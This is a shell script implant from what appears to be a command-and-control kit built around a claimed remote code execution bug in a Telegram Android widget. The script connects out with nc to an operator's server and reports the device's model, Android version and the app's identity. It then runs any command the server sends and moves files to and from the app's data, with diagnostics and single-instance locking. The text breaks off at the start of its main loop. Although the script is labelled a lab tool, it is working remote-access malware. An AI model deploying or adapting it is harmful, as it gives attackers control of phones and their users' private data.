#!/system/bin/sh
# telegramandroidwidget/c2/implant/implant.sh
#
# Local-only C2 implant for the Telegram Android widget RCE.
# Runs as the Telegram app UID (no root) on Android 13 / toybox.
# Also runs on a normal POSIX host with C2_MOCK=1 (used by the mock test).
#
# Protocol: one JSON object per line.  Every value the implant has to parse is
# a JSON *string*; commands and paths are base64 so they never contain quotes.
# The server (server/c2_server.py) is the only peer.
#
# Placeholders replaced by server/c2common.py:render_bootstrap() or
# tools/make_bootstrap.py:
#   __C2_HOST__  __C2_PORT__  __C2_TOKEN__  __C2_ID__  __C2_BUILD__
#
# C2_DIAG=1 is a one-shot transport/hello diagnostic: connect, send a fixed
# hello, print the first server line (the welcome), exit.  It never takes the
# implant lock and uses .diag.* FIFOs so it cannot disturb a live C2.
#
# Persistence honesty: this process survives an app *crash* (it is in its own
# session), but it does NOT survive `am force-stop`: Android 13 kills the whole
# UID cgroup, including this process and the supervisor.  No root, no exception.

VERSION="1.0"

C2_HOST="${C2_HOST:-__C2_HOST__}"
C2_PORT="${C2_PORT:-__C2_PORT__}"
C2_TOKEN="${C2_TOKEN:-__C2_TOKEN__}"
C2_ID="${C2_ID:-__C2_ID__}"
C2_BUILD="${C2_BUILD:-__C2_BUILD__}"
C2_DIAG="${C2_DIAG:-0}"
MOCK="${C2_MOCK:-0}"
APP="org.telegram.messenger.beta"

# ---------------------------------------------------------------- environment
export PATH="/system/bin:/system/xbin:/vendor/bin:/sbin:/usr/bin:/bin:$PATH"

if [ -n "$C2_DIR" ]; then
    D="$C2_DIR"
elif [ "$MOCK" = "1" ]; then
    D="${C2_MOCK_DIR:-/tmp/c2-mock}"
else
    D="/data/user/0/$APP/files/.c2"
fi

mkdir -p "$D" 2>/dev/null || {
    # last resort: the app's cache dir is always writable by the app UID
    D="/data/user/0/$APP/cache/.c2"
    mkdir -p "$D" 2>/dev/null || exit 1
}

# Default working directory for `exec`: the app's data directory
# (/data/user/0/<pkg>) on device, the mock dir on the host.  The Telegram
# process itself starts with cwd=/; commands should not inherit that.
if [ "$MOCK" = "1" ]; then
    APP_HOME="$D"
else
    APP_HOME=$(CDPATH= cd -- "$D/../.." 2>/dev/null && pwd)
    [ -n "$APP_HOME" ] || APP_HOME="$D"
fi

case "$C2_HOST" in
    __C2_*|"") echo "implant: unrendered host placeholder" >&2; exit 2 ;;
esac
case "$C2_ID" in
    __C2_*|"") C2_ID="" ;;
esac
case "$C2_TOKEN" in
    __C2_*|"") C2_TOKEN="" ;;
esac
case "$C2_BUILD" in
    __C2_*|"") C2_BUILD="dev" ;;
esac

if [ "$MOCK" = "1" ]; then
    UID_STR="${C2_MOCK_UID:-10123}"
    USER_NAME="${C2_MOCK_USER:-u0_a123}"
    DEVICE="${C2_MOCK_DEVICE:-Mock-Device}"
    ANDROID_VER="${C2_MOCK_ANDROID:-13}"
    APP_PID="${C2_MOCK_PID:-4242}"
else
    UID_STR="$(id -u 2>/dev/null)"
    USER_NAME="$(id -un 2>/dev/null)"
    [ -n "$USER_NAME" ] || USER_NAME="u0_a$UID_STR"
    DEVICE="$(getprop ro.product.model 2>/dev/null)"
    [ -n "$DEVICE" ] || DEVICE="android"
    ANDROID_VER="$(getprop ro.build.version.release 2>/dev/null)"
    [ -n "$ANDROID_VER" ] || ANDROID_VER="?"
    APP_PID="$(pidof "$APP" 2>/dev/null | tr '\n' ' ')"
    APP_PID="${APP_PID%% *}"
    # never let a newline/quote from pidof break the hello JSON line
    case "$APP_PID" in *[!0-9]*) APP_PID="" ;; esac
fi

[ -n "$C2_ID" ] || C2_ID="tg-$UID_STR-$(printf '%s' "$DEVICE" | tr -c 'A-Za-z0-9_.-' '_')"
# The id, token and build go into the hello unescaped; keep them in the safe
# charset so a missing/broken tr cannot produce invalid JSON or an empty token.
case "$C2_ID" in
    *[!A-Za-z0-9_.-]*) C2_ID="tg-$UID_STR" ;;
esac
case "$C2_TOKEN" in
    *[!A-Za-z0-9_.-]*) C2_TOKEN="" ;;
esac
SH="${C2_SH:-/system/bin/sh}"
[ -x "$SH" ] || SH="sh"

# ------------------------------------------------------------------ tools
if [ "$MOCK" = "1" ]; then
    NC_CMD="${C2_NC:-nc}"
    B64_CMD="${C2_B64:-base64}"
    SHA_CMD="${C2_SHA:-sha256sum}"
    SLEEP="${C2_SLEEP:-sleep}"
    SETSID="${C2_SETSID:-setsid}"
    TIMEOUT_CMD="${C2_TIMEOUT-timeout}"
    KILL="${C2_KILL:-kill}"
    DD_CMD="${C2_DD:-dd}"
else
    TB="/system/bin/toybox"
    NC_CMD="$TB nc"
    B64_CMD="$TB base64"
    SHA_CMD="$TB sha256sum"
    SLEEP="/system/bin/sleep"
    SETSID="/system/bin/setsid"
    TIMEOUT_CMD="$TB timeout"
    KILL="/system/bin/kill"
    DD_CMD="/system/bin/dd"
fi

# probe optional applets; fall back rather than abort
$B64_CMD </dev/null >/dev/null 2>&1 || B64_CMD="base64"
$SHA_CMD </dev/null >/dev/null 2>&1 || SHA_CMD="sha256sum"
$DD_CMD if=/dev/null of=/dev/null bs=1 count=0 >/dev/null 2>&1 || DD_CMD="dd"
if [ -n "$TIMEOUT_CMD" ]; then
    $TIMEOUT_CMD 0 true >/dev/null 2>&1 || TIMEOUT_CMD=""
fi
[ -x "$SETSID" ] || SETSID="setsid"
[ -x "$KILL" ] || KILL="kill"

# runtime state
IN="$D/.in"
OUT="$D/.out"
CMDQ="$D/.cmdq"
HB="$D/hb"
LOG="$D/implant.log"
STOP="$D/stop"
RESTART="$D/restart"
PIDF="$D/implant.pid"

NCPID=""
CATPID=""
CONNECTED=0
LAST_CMD=0
BACKOFF=1
LAST_RX=0
RX_TIMEOUT="${C2_RX_TIMEOUT:-75}"   # server pings every ~30s; 75s = 2 missed
LOCK="$D/implant.lock"

# exec state (one exec at a time per session)
EXEC_ID=""
EXEC_CMD=""
EXEC_START=0
EXEC_TIMEOUT=60
EXEC_WRAP=""
OUTF=""
ERRF=""
RCF=""
OUT_LAST=0
OUT_COUNT=0
OUT_BYTES=0
ERR_LAST=0
ERR_COUNT=0
ERR_BYTES=0
MAX_OUT=1048576
TRUNC=0
TIMEDOUT=0

# put state (chunked upload)
PUT_PATH=""
PUT_TMP=""
PUT_SIZE=""
PUT_SHA=""
PUT_ACTIVE=0

# ------------------------------------------------------------------ helpers
now() { date +%s 2>/dev/null || echo 0; }

proc_alive() {
    # kill -0 is true for a zombie; /proc/<pid>/stat field 3 is the state.
    p="$1"
    case "$p" in ''|*[!0-9]*) return 1 ;; esac
    kill -0 "$p" 2>/dev/null || return 1
    if [ -r "/proc/$p/stat" ]; then
        s=$(cut -d' ' -f3 "/proc/$p/stat" 2>/dev/null)
        [ "$s" = "Z" ] && return 1
    fi
    return 0
}

log() {
    # keep the log bounded; one rotation is enough for a lab C2
    sz=0
    if [ -f "$LOG" ]; then sz=$(wc -c < "$LOG" 2>/dev/null); fi
    case "$sz" in ''|*[!0-9]*) sz=0 ;; esac
    if [ "$sz" -gt 1048576 ]; then mv -f "$LOG" "$LOG.1" 2>/dev/null; fi
    printf '%s %s\n' "$(date '+%F %T' 2>/dev/null)" "$*" >> "$LOG" 2>/dev/null
}

jesc() {
    # JSON string safety for hello fields (device props are untrusted input)
    printf '%s' "$1" | tr -d '\r\n"\\'
}

diag_trace() {
    # Durable stage trace: every call opens/appends/closes, so a kill or a
    # cgroup freeze still leaves the last completed stage on disk.
    [ "$C2_DIAG" = "1" ] || return 0
    printf '%s %s\n' "$(date +%s 2>/dev/null)" "$*" >> "$D/diag.trace" 2>/dev/null
}

diag_out() {
    printf '%s\n' "$*"
    diag_trace "OUT $*"
}

diag_err() {
    [ "$C2_DIAG" = "1" ] || return 0
    diag_out "DIAG_ERR $1 rc=$2"
}

b64e() { $B64_CMD 2>/dev/null | tr -d '\n'; }
b64d() { printf '%s' "$1" | $B64_CMD -d 2>/dev/null; }

sha_file() { $SHA_CMD "$1" 2>/dev/null | cut -d' ' -f1; }

jget() {
    # jget <key> <json-line>   (all protocol values are JSON strings)
    # tolerate optional spaces after ':' in case a hand-written client is used
    printf '%s\n' "$2" | sed -n 's/.*"'"$1"'"[ ]*:[ ]*"\([^"]*\)".*/\1/p'
}

send_line() {
    # fd 9 was opened O_RDWR on OUT in connect(); fd 9 is also a writer, so
    # toybox nc never sees stdin EOF between sends, and the write cannot
    # block on a missing reader.
    [ "$CONNECTED" = "1" ] || return 1
    printf '%s\n' "$1" >&9 2>/dev/null || return 1
    return 0
}

send_line_to() {
    # Bounded variant for hello/diag.  fd 9 is a reader on OUT, so the open
    # is normally satisfied even if nc is dead; the timeout is belt-and-braces
    # against a pathological FIFO state.
    [ "$CONNECTED" = "1" ] || return 1
    if [ -n "$TIMEOUT_CMD" ]; then
        $TIMEOUT_CMD 3 "$SH" -c 'printf "%s\n" "$1" >> "$2"' _ "$1" "$OUT" 2>/dev/null
        return $?
    fi
    printf '%s\n' "$1" >> "$OUT" 2>/dev/null || return 1
    return 0
}

hb() { now > "$HB" 2>/dev/null; }

# ------------------------------------------------------------------ transport
# Device 02:12 trace: the shell stopped at `cn-nc-cmd`, i.e. setting up
# `nc <OUT >IN &`.  mksh sets up the background redirections before starting
# the next command; `>IN` blocked because IN had no open reader yet (cat is
# started afterwards).  The watcher avoided this by pre-opening BOTH FIFOs
# O_RDWR in the parent: O_RDWR never blocks, and every child redirection is
# then satisfied.  Do exactly that (8=IN, 9=OUT).  fd 9 also keeps nc's stdin
# open so toybox nc does not exit on EOF between sends.
connect() {
    diag_trace "stage=cn-begin"
    diag_trace "stage=cn-rm-begin"
    rm -f "$IN" "$OUT"
    rc=$?
    diag_trace "stage=cn-rm rc=$rc"

    diag_trace "stage=cn-mkfifo-begin"
    mkfifo "$IN" "$OUT"
    rc=$?
    diag_trace "stage=cn-mkfifo rc=$rc"
    if [ "$rc" -ne 0 ]; then
        diag_err mkfifo "$rc"
        return 1
    fi

    diag_trace "stage=cn-fd8-begin"
    exec 8<>"$IN"
    rc=$?
    diag_trace "stage=cn-fd8 rc=$rc"
    if [ "$rc" -ne 0 ]; then
        diag_err fd8 "$rc"
        rm -f "$IN" "$OUT" 2>/dev/null
        return 1
    fi
    diag_trace "stage=cn-fd9-begin"
    exec 9<>"$OUT"
    rc=$?
    diag_trace "stage=cn-fd9 rc=$rc"
    if [ "$rc" -ne 0 ]; then
        diag_err fd9 "$rc"
        exec 8>&- 2>/dev/null
        rm -f "$IN" "$OUT" 2>/dev/null
        return 1
    fi

    diag_trace "stage=cn-nc-cmd $NC_CMD $C2_HOST $C2_PORT <$OUT >$IN"
    $NC_CMD "$C2_HOST" "$C2_PORT" <"$OUT" >"$IN" &
    diag_trace "stage=cn-nc-fork"
    NCPID=$!
    diag_trace "stage=cn-nc-pid $NCPID"

    cat "$IN" >> "$CMDQ" &
    diag_trace "stage=cn-cat-fork"
    CATPID=$!
    diag_trace "stage=cn-cat-pid $CATPID"

    $SLEEP 0.2
    diag_trace "stage=cn-settle"
    if ! proc_alive "$NCPID"; then
        diag_err nc_start 1
        close_conn
        return 1
    fi
    if ! proc_alive "$CATPID"; then
        diag_err cat_start 1
        close_conn
        return 1
    fi
    CONNECTED=1
    : > "$CMDQ"
    LAST_CMD=0
    diag_trace "stage=cn-done"
    return 0
}

close_conn() {
    CONNECTED=0
    # a lost session must not leave an orphaned command running
    if [ -n "$EXEC_ID" ]; then
        kill_exec
        rm -f "$OUTF" "$ERRF" "$RCF" "$D/exec.pid" 2>/dev/null
        EXEC_ID=""
        EXEC_WRAP=""
    fi
    [ -n "$NCPID" ] && { kill "$NCPID" 2>/dev/null || :; }
    [ -n "$CATPID" ] && { kill "$CATPID" 2>/dev/null || :; }
    exec 9>&- 2>/dev/null
    exec 8>&- 2>/dev/null
    # killed children return 143; this is expected cleanup, not a diag error
    [ -n "$NCPID" ] && { wait "$NCPID" 2>/dev/null || :; }
    [ -n "$CATPID" ] && { wait "$CATPID" 2>/dev/null || :; }
    NCPID=""
    CATPID=""
    rm -f "$IN" "$OUT" 2>/dev/null
}

send_hello() {
    # Raw fields are restricted to [A-Za-z0-9_.-]; only free-form device
    # metadata goes through jesc (a tr failure there must not kill the token).
    ok=0
    send_line_to "{\"op\":\"hello\",\"implant\":\"$C2_ID\",\"uid\":\"$UID_STR\",\"user\":\"$(jesc "$USER_NAME")\",\"device\":\"$(jesc "$DEVICE")\",\"android\":\"$(jesc "$ANDROID_VER")\",\"app\":\"$APP\",\"pid\":\"$APP_PID\",\"token\":\"$C2_TOKEN\",\"version\":\"$VERSION\",\"build\":\"$C2_BUILD\",\"mock\":\"$MOCK\",\"ts\":\"$(now)\"}" || ok=1
    log "HELLO id=$C2_ID uid=$UID_STR pid=$APP_PID build=$C2_BUILD"
    return "$ok"
}

# ------------------------------------------------------------------ exec
stream_new() {
    # Uses SF_FILE/SF_OP/SF_LAST/SF_COUNT/SF_BYTES; updates them in place.
    [ -f "$SF_FILE" ] || return 0
    SF_TOTAL=$(wc -l < "$SF_FILE" 2>/dev/null)
    case "$SF_TOTAL" in ''|*[!0-9]*) SF_TOTAL=0 ;; esac
    [ "$SF_LAST" -lt "$SF_TOTAL" ] || return 0

    sed -n "$((SF_LAST + 1)),${SF_TOTAL}p" "$SF_FILE" > "$D/.chunk" 2>/dev/null
    while IFS= read -r l || [ -n "$l" ]; do
        if [ "$SF_BYTES" -ge "$MAX_OUT" ]; then
            TRUNC=1
            SF_LAST=$SF_TOTAL
            return 0
        fi
        b=$(printf '%s' "$l" | b64e)
        send_line "{\"op\":\"$SF_OP\",\"id\":\"$EXEC_ID\",\"seq\":\"$SF_COUNT\",\"b64\":\"$b\"}" || return 1
        SF_COUNT=$((SF_COUNT + 1))
        SF_BYTES=$((SF_BYTES + ${#l} + 1))
    done < "$D/.chunk"
    SF_LAST=$SF_TOTAL
    return 0
}

send_done() {
    rc="$1"
    send_line "{\"op\":\"done\",\"id\":\"$EXEC_ID\",\"rc\":\"$rc\",\"out_lines\":\"$OUT_COUNT\",\"err_lines\":\"$ERR_COUNT\",\"out_bytes\":\"$OUT_BYTES\",\"err_bytes\":\"$ERR_BYTES\",\"trunc\":\"$TRUNC\",\"timeout\":\"$TIMEDOUT\"}"
    log "EXEC_DONE id=$EXEC_ID rc=$rc out=$OUT_COUNT err=$ERR_COUNT trunc=$TRUNC timeout=$TIMEDOUT"
}

exec_start() {
    EXEC_ID="$1"
    EXEC_CMD="$2"
    EXEC_TIMEOUT="${3:-60}"
    case "$EXEC_TIMEOUT" in ''|*[!0-9]*) EXEC_TIMEOUT=60 ;; esac
    MAX_OUT="${4:-1048576}"
    case "$MAX_OUT" in ''|*[!0-9]*) MAX_OUT=1048576 ;; esac

    OUTF="$D/.o.$EXEC_ID"
    ERRF="$D/.e.$EXEC_ID"
    RCF="$D/.r.$EXEC_ID"
    : > "$OUTF"
    : > "$ERRF"
    rm -f "$RCF" "$D/exec.pid" 2>/dev/null
    OUT_LAST=0; OUT_COUNT=0; OUT_BYTES=0
    ERR_LAST=0; ERR_COUNT=0; ERR_BYTES=0
    TRUNC=0; TIMEDOUT=0
    EXEC_START=$(now)

    # The wrapper stays outside the command's session so it can still record
    # the exit code if we have to kill the command's process group.
    (
        cd "$APP_HOME" 2>/dev/null || cd "$D" 2>/dev/null || true
        if [ -n "$TIMEOUT_CMD" ]; then
            $SETSID $TIMEOUT_CMD "$EXEC_TIMEOUT" "$SH" -c "$EXEC_CMD" >"$OUTF" 2>"$ERRF" &
        else
            $SETSID "$SH" -c "$EXEC_CMD" >"$OUTF" 2>"$ERRF" &
        fi
        CPID=$!
        printf '%s\n' "$CPID" > "$D/exec.pid"
        wait "$CPID" 2>/dev/null
        printf '%s\n' "$?" > "$RCF"
    ) &
    EXEC_WRAP=$!
    log "EXEC_START id=$EXEC_ID timeout=$EXEC_TIMEOUT cmd=$(printf '%s' "$EXEC_CMD" | head -c 200 | tr '\n' ' ')"
}

kill_exec() {
    p=$(cat "$D/exec.pid" 2>/dev/null)
    case "$p" in ''|*[!0-9]*) p="" ;; esac
    if [ -n "$p" ]; then
        "$KILL" -9 -- "-$p" 2>/dev/null || "$KILL" -9 "$p" 2>/dev/null
    fi
}

stream_exec() {
    [ -z "$EXEC_ID" ] && return 0

    if [ "$TRUNC" != "1" ]; then
        SF_FILE="$OUTF"; SF_OP="out"; SF_LAST=$OUT_LAST; SF_COUNT=$OUT_COUNT; SF_BYTES=$OUT_BYTES
        stream_new
        OUT_LAST=$SF_LAST; OUT_COUNT=$SF_COUNT; OUT_BYTES=$SF_BYTES
        if [ "$TRUNC" = "1" ]; then kill_exec; fi
    fi

    if [ "$TRUNC" != "1" ]; then
        SF_FILE="$ERRF"; SF_OP="err"; SF_LAST=$ERR_LAST; SF_COUNT=$ERR_COUNT; SF_BYTES=$ERR_BYTES
        stream_new
        ERR_LAST=$SF_LAST; ERR_COUNT=$SF_COUNT; ERR_BYTES=$SF_BYTES
        if [ "$TRUNC" = "1" ]; then kill_exec; fi
    fi

    if [ ! -f "$RCF" ]; then
        el=$(( $(now) - EXEC_START ))
        if [ "$el" -gt $((EXEC_TIMEOUT + 5)) ]; then
            TIMEDOUT=1
            TRUNC=1
            kill_exec
        fi
        return 0
    fi

    # command finished: drain what is already written, then a final partial line
    if [ "$TRUNC" != "1" ]; then
        SF_FILE="$OUTF"; SF_OP="out"; SF_LAST=$OUT_LAST; SF_COUNT=$OUT_COUNT; SF_BYTES=$OUT_BYTES
        stream_new; OUT_LAST=$SF_LAST; OUT_COUNT=$SF_COUNT; OUT_BYTES=$SF_BYTES
        SF_FILE="$ERRF"; SF_OP="err"; SF_LAST=$ERR_LAST; SF_COUNT=$ERR_COUNT; SF_BYTES=$ERR_BYTES
        stream_new; ERR_LAST=$SF_LAST; ERR_COUNT=$SF_COUNT; ERR_BYTES=$SF_BYTES
    fi

    if [ "$TRUNC" != "1" ] && [ -s "$OUTF" ] && [ "$(tail -c 1 "$OUTF" 2>/dev/null | wc -l)" -eq 0 ]; then
        l=$(tail -n +$((OUT_LAST + 1)) "$OUTF" 2>/dev/null)
        if [ -n "$l" ]; then
            b=$(printf '%s' "$l" | b64e)
            send_line "{\"op\":\"out\",\"id\":\"$EXEC_ID\",\"seq\":\"$OUT_COUNT\",\"b64\":\"$b\"}"
            OUT_COUNT=$((OUT_COUNT + 1)); OUT_LAST=$((OUT_LAST + 1))
        fi
    fi
    if [ "$TRUNC" != "1" ] && [ -s "$ERRF" ] && [ "$(tail -c 1 "$ERRF" 2>/dev/null | wc -l)" -eq 0 ]; then
        l=$(tail -n +$((ERR_LAST + 1)) "$ERRF" 2>/dev/null)
        if [ -n "$l" ]; then
            b=$(printf '%s' "$l" | b64e)
            send_line "{\"op\":\"err\",\"id\":\"$EXEC_ID\",\"seq\":\"$ERR_COUNT\",\"b64\":\"$b\"}"
            ERR_COUNT=$((ERR_COUNT + 1)); ERR_LAST=$((ERR_LAST + 1))
        fi
    fi

    rc=$(cat "$RCF" 2>/dev/null)
    case "$rc" in ''|*[!0-9]*) rc=255 ;; esac
    # GNU/toybox timeout use 124 when the deadline fired; the main-loop
    # backstop sets TIMEDOUT explicitly for shells without a timeout applet.
    [ "$rc" = "124" ] && TIMEDOUT=1
    send_done "$rc"
    rm -f "$OUTF" "$ERRF" "$RCF" "$D/exec.pid" 2>/dev/null
    EXEC_ID=""
    EXEC_WRAP=""
}

# ------------------------------------------------------------------ file xfer
do_get() {
    # do_get <id> <remote-path>
    gid="$1"; gp="$2"
    if [ ! -f "$gp" ]; then
        send_line "{\"op\":\"error\",\"id\":\"$gid\",\"msg\":\"not a regular file\"}"
        return
    fi
    gsize=$(wc -c < "$gp" 2>/dev/null)
    case "$gsize" in ''|*[!0-9]*) gsize=0 ;; esac
    gsha=$(sha_file "$gp")
    gseq=0
    goff=0
    while [ "$goff" -lt "$gsize" ]; do
        gb=$($DD_CMD if="$gp" bs=16384 skip="$gseq" count=1 2>/dev/null | b64e)
        send_line "{\"op\":\"file\",\"id\":\"$gid\",\"seq\":\"$gseq\",\"b64\":\"$gb\"}" || return 1
        gseq=$((gseq + 1))
        goff=$((goff + 16384))
        hb
    done
    send_line "{\"op\":\"file_done\",\"id\":\"$gid\",\"size\":\"$gsize\",\"sha256\":\"$gsha\"}"
    LAST_RX=$(now)   # a large transfer keeps the main loop busy
    log "GET id=$gid path=$gp size=$gsize"
}

do_put() {
    # do_put <id> <path> <b64> [expected-sha] [expected-size]
    pid="$1"; pp="$2"; pb="$3"; psha="$4"; psize="$5"
    pdir=$(dirname "$pp" 2>/dev/null)
    [ -n "$pdir" ] && mkdir -p "$pdir" 2>/dev/null
    ptmp="$D/.put.$pid.tmp"
    if ! printf '%s' "$pb" | $B64_CMD -d > "$ptmp" 2>/dev/null; then
        rm -f "$ptmp"
        send_line "{\"op\":\"error\",\"id\":\"$pid\",\"msg\":\"base64 decode failed\"}"
        return
    fi
    got=$(wc -c < "$ptmp" 2>/dev/null)
    case "$got" in ''|*[!0-9]*) got=0 ;; esac
    if [ -n "$psize" ] && [ "$got" != "$psize" ]; then
        rm -f "$ptmp"
        send_line "{\"op\":\"error\",\"id\":\"$pid\",\"msg\":\"size mismatch got=$got want=$psize\"}"
        return
    fi
    if [ -n "$psha" ]; then
        gsha=$(sha_file "$ptmp")
        # no sha256sum applet => gsha empty; do not fail the transfer
        if [ -n "$gsha" ] && [ "$gsha" != "$psha" ]; then
            rm -f "$ptmp"
            send_line "{\"op\":\"error\",\"id\":\"$pid\",\"msg\":\"sha256 mismatch\"}"
            return
        fi
    fi
    chmod 600 "$ptmp" 2>/dev/null
    mv -f "$ptmp" "$pp" 2>/dev/null || {
        rm -f "$ptmp"
        send_line "{\"op\":\"error\",\"id\":\"$pid\",\"msg\":\"rename failed\"}"
        return
    }
    send_line "{\"op\":\"put_done\",\"id\":\"$pid\",\"path_b64\":\"$(printf '%s' "$pp" | b64e)\",\"size\":\"$got\"}"
    log "PUT id=$pid path=$pp size=$got"
}

# ------------------------------------------------------------------ dispatch
handle_line() {
    line="$1"
    op=$(jget op "$line")
    id=$(jget id "$line")

    case "$op" in
        ping)
            send_line "{\"op\":\"pong\",\"id\":\"$id\",\"ts\":\"$(now)\"}"
            ;;
        welcome)
            # first server reply after hello; proves the session end to end
            log "WELCOME session=$(jget session "$line") build=$(jget build "$line")"
            ;;
        exec)
            if [ -n "$EXEC_ID" ]; then
                send_line "{\"op\":\"error\",\"id\":\"$id\",\"msg\":\"exec already running\"}"
                return
            fi
            cb=$(jget cmd "$line")
            cmd=$(b64d "$cb")
            to=$(jget timeout "$line")
            mo=$(jget max_out "$line")
            exec_start "$id" "$cmd" "$to" "$mo"
            ;;
        get)
            pb=$(jget path_b64 "$line")
            gp=$(b64d "$pb")
            do_get "$id" "$gp"
            ;;
        put)
            pb=$(jget path_b64 "$line")
            pp=$(b64d "$pb")
            pb64=$(jget b64 "$line")
            do_put "$id" "$pp" "$pb64" "$(jget sha256 "$line")" "$(jget size "$line")"
            ;;
        put_begin)
            PUT_PATH=$(b64d "$(jget path_b64 "$line")")
            PUT_SIZE=$(jget size "$line")
            PUT_SHA=$(jget sha256 "$line")
            PUT_TMP="$D/.put.$id.tmp"
            pdir=$(dirname "$PUT_PATH" 2>/dev/null)
            [ -n "$pdir" ] && mkdir -p "$pdir" 2>/dev/null
            : > "$PUT_TMP" 2>/dev/null
            PUT_ACTIVE=1
            send_line "{\"op\":\"put_ready\",\"id\":\"$id\"}"
            ;;
        put_chunk)
            if [ "$PUT_ACTIVE" = 1 ]; then
                cb=$(jget b64 "$line")
                printf '%s' "$cb" | $B64_CMD -d >> "$PUT_TMP" 2>/dev/null
            fi
            ;;
        put_end)
            if [ "$PUT_ACTIVE" = 1 ]; then
                PUT_ACTIVE=0
                got=$(wc -c < "$PUT_TMP" 2>/dev/null)
                case "$got" in ''|*[!0-9]*) got=0 ;; esac
                gsha=$(sha_file "$PUT_TMP")
                if [ -n "$PUT_SIZE" ] && [ "$got" != "$PUT_SIZE" ]; then
                    rm -f "$PUT_TMP"
                    send_line "{\"op\":\"error\",\"id\":\"$id\",\"msg\":\"size mismatch got=$got want=$PUT_SIZE\"}"
                elif [ -n "$PUT_SHA" ] && [ -n "$gsha" ] && [ "$gsha" != "$PUT_SHA" ]; then
                    rm -f "$PUT_TMP"
                    send_line "{\"op\":\"error\",\"id\":\"$id\",\"msg\":\"sha256 mismatch\"}"
                else
                    chmod 600 "$PUT_TMP" 2>/dev/null
                    mv -f "$PUT_TMP" "$PUT_PATH" 2>/dev/null
                    send_line "{\"op\":\"put_done\",\"id\":\"$id\",\"path_b64\":\"$(printf '%s' "$PUT_PATH" | b64e)\",\"size\":\"$got\"}"
                    log "PUT id=$id path=$PUT_PATH size=$got (chunked)"
                fi
            fi
            ;;
        sleep)
            secs=$(jget secs "$line")
            case "$secs" in ''|*[!0-9]*) secs=1 ;; esac
            [ "$secs" -gt 3600 ] && secs=3600
            send_line "{\"op\":\"slept\",\"id\":\"$id\",\"secs\":\"$secs\"}"
            left="$secs"
            while [ "$left" -gt 0 ]; do
                s=5
                [ "$left" -lt 5 ] && s="$left"
                $SLEEP "$s"
                left=$((left - s))
                hb
            done
            LAST_RX=$(now)   # the server suppresses pings during sleep
            ;;
        reconnect)
            delay=$(jget delay "$line")
            case "$delay" in ''|*[!0-9]*) delay=2 ;; esac
            send_line "{\"op\":\"ack\",\"id\":\"$id\",\"what\":\"reconnect\"}"
            log "RECONNECT requested delay=$delay"
            $SLEEP 0.2
            close_conn
            $SLEEP "$delay"
            ;;
        bye)
            stop=$(jget stop "$line")
            send_line "{\"op\":\"ack\",\"id\":\"$id\",\"what\":\"bye\",\"stop\":\"$stop\"}"
            log "BYE stop=$stop"
            $SLEEP 0.2
            close_conn
            if [ "$stop" = "1" ]; then
                now > "$STOP" 2>/dev/null
                exit 0
            fi
            $SLEEP 1
            ;;
        *)
            send_line "{\"op\":\"error\",\"id\":\"$id\",\"msg\":\"unknown op\"}"
            ;;
    esac
}

# ------------------------------------------------------------------ diag
diag_send() {
    # Bounded write: the inner sh opens OUT for writing; toybox timeout kills
    # it if nc is not reading (no reader => the FIFO open would block).
    diag_trace "stage=ds-begin"
    send_line_to "$1"
    rc=$?
    diag_trace "stage=ds-end rc=$rc"
    return "$rc"
}

diag_run() {
    # One-shot transport + hello check.  Uses .diag.* FIFOs so a live implant
    # sharing $D is not disturbed.  DIAG_* lines go to stdout ($D/diag.out);
    # every stage is also appended durably to $D/diag.trace.
    IN="$D/.diag.in"
    OUT="$D/.diag.out"
    CMDQ="$D/.diag.cmdq"
    w="${C2_DIAG_WAIT:-5}"
    case "$w" in ''|*[!0-9]*) w=5 ;; esac
    [ "$w" -lt 1 ] && w=1
    [ "$w" -gt 30 ] && w=30

    diag_out "DIAG_START host=$C2_HOST port=$C2_PORT build=$C2_BUILD uid=$UID_STR"
    diag_trace "stage=env d=$D sh=$SH nc=$NC_CMD host=$C2_HOST port=$C2_PORT sleep=$SLEEP timeout=${TIMEOUT_CMD:-none}"
    diag_trace "stage=path path=$PATH"
    diag_trace "stage=fd0 $(ls -l /proc/$$/fd/0 2>/dev/null)"
    diag_trace "stage=dir $(ls -ld "$D" 2>/dev/null)"
    : > "$D/.diag.wtest" 2>/dev/null
    wr=$?
    rm -f "$D/.diag.wtest" 2>/dev/null
    diag_trace "stage=write rc=$wr"

    i=0
    while [ "$i" -lt 3 ]; do
        diag_trace "stage=attempt $i"
        if connect; then break; fi
        i=$((i + 1))
        $SLEEP 1
    done
    if [ "$CONNECTED" != "1" ]; then
        diag_err connect 1
        close_conn
        return 1
    fi

    # fixed hello: no jesc/sed/date dependency, so this isolates the transport
    dh="{\"op\":\"hello\",\"implant\":\"diag-$UID_STR\",\"uid\":\"$UID_STR\",\"user\":\"diag\",\"device\":\"diag\",\"android\":\"diag\",\"app\":\"$APP\",\"pid\":\"$APP_PID\",\"token\":\"$C2_TOKEN\",\"version\":\"diag\",\"build\":\"$C2_BUILD\",\"mock\":\"$MOCK\",\"ts\":\"0\"}"
    diag_trace "stage=send-begin len=${#dh}"
    diag_send "$dh"
    src=$?
    if [ "$src" -ne 0 ]; then
        diag_err send "$src"
        close_conn
        return 1
    fi
    diag_out "DIAG_SENT op=hello implant=diag-$UID_STR build=$C2_BUILD"

    end=$(( $(now) + w ))
    line=""
    diag_trace "stage=wait-begin w=$w"
    while [ "$(now)" -lt "$end" ]; do
        t=$(wc -l < "$CMDQ" 2>/dev/null)
        case "$t" in ''|*[!0-9]*) t=0 ;; esac
        if [ "$t" -gt 0 ]; then
            line=$(sed -n '1p' "$CMDQ" 2>/dev/null)
            break
        fi
        $SLEEP 0.2
    done
    if [ -n "$line" ]; then
        diag_out "DIAG_RX $line"
        diag_trace "stage=rx"
        rc=0
    else
        diag_out "DIAG_NO_REPLY waited=${w}s (server log is authoritative)"
        diag_err wait_timeout 1
        rc=1
    fi
    close_conn
    return "$rc"
}

# ------------------------------------------------------------------ single instance
implant_lock() {
    if ! mkdir "$LOCK" 2>/dev/null; then
        old=$(cat "$LOCK/pid" 2>/dev/null)
        if [ -n "$old" ] && kill -0 "$old" 2>/dev/null; then
            c=""
            if [ -r "/proc/$old/cmdline" ]; then
                c=$(tr '\0' ' ' < "/proc/$old/cmdline" 2>/dev/null)
            fi
            case "$c" in
                *implant.sh*) return 1 ;;
                "") return 1 ;;
            esac
        fi
        rm -rf "$LOCK" 2>/dev/null
        mkdir "$LOCK" 2>/dev/null || return 1
    fi
    printf '%s\n' "$$" > "$LOCK/pid"
    return 0
}

cleanup_exit() {
    close_conn
    rm -rf "$LOCK" 2>/dev/null
    log "TERM"
    exit 0
}

# ------------------------------------------------------------------ main
if [ "$C2_DIAG" = "1" ]; then
